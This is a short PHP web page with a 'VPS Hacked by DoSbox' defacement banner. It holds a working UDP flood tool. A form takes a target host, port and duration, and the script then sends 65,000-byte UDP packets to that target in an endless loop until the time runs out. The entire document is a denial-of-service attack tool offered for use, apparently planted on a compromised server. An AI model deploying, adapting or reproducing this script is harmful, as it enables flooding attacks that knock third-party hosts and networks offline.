<html>
<body>
<center>
<pre>
_-_-_-VPS Hacked by DoSbox-_-_-_</pre>
<?php
if(isset($_GET['host'])&&isset($_GET['time'])){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);

    $exec_time = $_GET['time'];

    $time = time();

    $max_time = $time+$exec_time;

    $host = $_GET['host'];

    for($i=0;$i<65000;$i++){
    $out .= 'X';
    }
    while(1){
    $packets++;
    if(time() > $max_time){
  break;
    }
            //$rand = rand(1,65535);
    $rand = $_GET['port'];
    $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
    if($fp){
  fwrite($fp, $out);
  fclose($fp);
    }
    }
  echo "<br><b>UDP Flood</b><br>Completed with " . round(($packets*65)/1024, 2) . " MB of data sent, averaging " . round(($packets*65)/1024/$time, 2) . "megabytes a second.";
    echo '<br><br>
  <form action="'.$surl.'" method=GET>
  <input type="hidden" name="act" value="phptools">
  Host: <br><input type=text name=host><br>
        Port: <br><input type=text name=port value=80><br>
  Seconds: <br><input type=text name=time value=120><br>
  <input type=submit value=Go></form>';
}else{ echo '<br><b>UDP Flood</b><br>
    <form action=? method=GET>
    <input type="hidden" name="act" value="phptools">
    Host: <br><input type=text name=host value=><br>
    Port: <br><input type=text name=port value=80><br>
    Seconds: <br><input type=text name=time value=120><br><br>
    <input type=submit value=DDoS></form>';
}
?>
</center>
</body>
</html>